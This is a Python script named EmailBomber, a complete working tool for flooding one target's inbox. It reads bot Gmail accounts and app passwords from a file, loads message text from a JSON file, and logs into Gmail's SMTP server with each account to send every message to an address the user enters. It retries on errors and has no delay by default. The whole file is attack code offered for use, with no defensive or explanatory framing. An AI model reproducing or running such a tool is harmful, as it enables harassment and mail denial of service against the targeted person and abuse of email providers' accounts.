import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import json
import re
from pathlib import Path
import sys
import time

class EmailBomber:

    def __init__(self):
        self.credentials_path = self.get_script_dir() / "bots.txt"
        self.content_path = self.get_script_dir() / "content.json"
        self.target_email = None
        self.credentials = []
        self.email_content = []
        self.delay = 0
        self.retry_interval = 5  
        self.max_retries = 36  

    def find_file(self, file_name: str) -> str:
        if os.path.exists(file_name):
            return file_name
        working_dir = os.getcwd()
        file_path = os.path.join(working_dir, file_name)
        if os.path.exists(file_path):
            return file_path
        return None

    def read_credentials(self):
        file_path = self.find_file(str(self.credentials_path))
        if not file_path or not self.validate_file(file_path, 'txt'):
            raise FileNotFoundError(f"[!] The file {self.credentials_path} does not exist or is not a valid .txt file.")

        with open(file_path, 'r') as f:
            for line in f:
                try:
                    email, app_password = line.strip().split('/')
                    if not self.check_email(email):
                        raise ValueError(f"Invalid email format: {email}")
                    self.credentials.append((email, app_password))

                except ValueError as e:
                    print(f"[!] Incorrect format in line: {line.strip()}. Error: {e}")

    def read_content(self):
        file_path = self.find_file(str(self.content_path))
        if not file_path or not self.validate_file(file_path, 'json'):
            raise FileNotFoundError(f"[!] The file {self.content_path} does not exist or is not a valid .json file.")

        with open(file_path, 'r', encoding='utf-8') as f:
            try:
                data = json.load(f)
                if isinstance(data, dict):
                    for key, value in data.items():
                        self.email_content.append((key, value))
                else:
                    print("[!] The JSON file is not a valid dictionary.")

            except json.JSONDecodeError as e:
                print(f"[!] Error decoding JSON: {e}")

    def bomb_email(self, server):
        def send_email(server, email, app_password):
            retries = 0

            while retries < self.max_retries:
                try:
                    server.login(email, app_password)
                    print(f"[+] Successful login from {email}")

                    for subject, message in self.email_content:
                        msg = MIMEMultipart()
                        msg['From'] = email
                        msg['To'] = self.target_email
                        msg['Subject'] = subject
                        msg.attach(MIMEText(message, 'plain'))

                        server.sendmail(email, self.target_email, msg.as_string())
                        print(f"[+] Email sent from {email} to {self.target_email} with subject: {subject}")

                    return True 

                except smtplib.SMTPAuthenticationError:
                    print(f"[!] Authentication error for {email}")
                    return False 

                except smtplib.SMTPException as e:
                    print(f"[!] Error sending email from {email}: {e}")
                    retries += 1
                    time.sleep(self.retry_interval) 

            return False 

        for email, app_password in self.credentials:
            if send_email(server, email, app_password):
                time.sleep(self.delay) 

    def get_script_dir(self):
        if getattr(sys, "frozen", False):
            return  Path(sys._MEIPASS or sys.executable).resolve().parent
        try:
            return Path(__file__).resolve().parent
        except NameError:
            return Path(sys.argv[0]).resolve().parent if sys.argv and sys.argv[0] else Path.cwd()

    def spam_email(self):
        self.target_email = self.target_email
        self.credentials = []
        self.email_content = []
        self.read_credentials()
        self.read_content()

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            self.bomb_email(server)
            server.quit()
        except smtplib.SMTPException as e:
            print(f"[!] SMTP connection error: {e}")

    @staticmethod
    def check_email(email: str) -> bool:
        pattern = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
        return re.match(pattern, email) is not None

    @staticmethod
    def validate_file(file_path: str, extension: str) -> bool:
        if not os.path.exists(file_path):
            return False
        if not file_path.endswith(f'.{extension}'):
            return False
        return True

    def run(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self.target_email = input("[+] Enter the target email address: ")
        while not self.check_email(self.target_email):
            os.system('clear' if os.name == 'posix' else 'cls')
            print("[!] Invalid email format. Please try again.\n")
            self.target_email = input("[+] Enter the target email address: ")

        os.system('clear' if os.name == 'posix' else 'cls')
        self.content_path = input("[+] Enter the path to the content JSON file (default: content.json): ") or self.content_path
        self.credentials_path = input("[+] Enter the path to the credentials file (default: bots.txt): ") or self.credentials_path
        self.delay = int(input("[+] Enter the delay between emails in seconds (default: 0): ") or 0)

        self.spam_email()

es = EmailBomber()
es.run()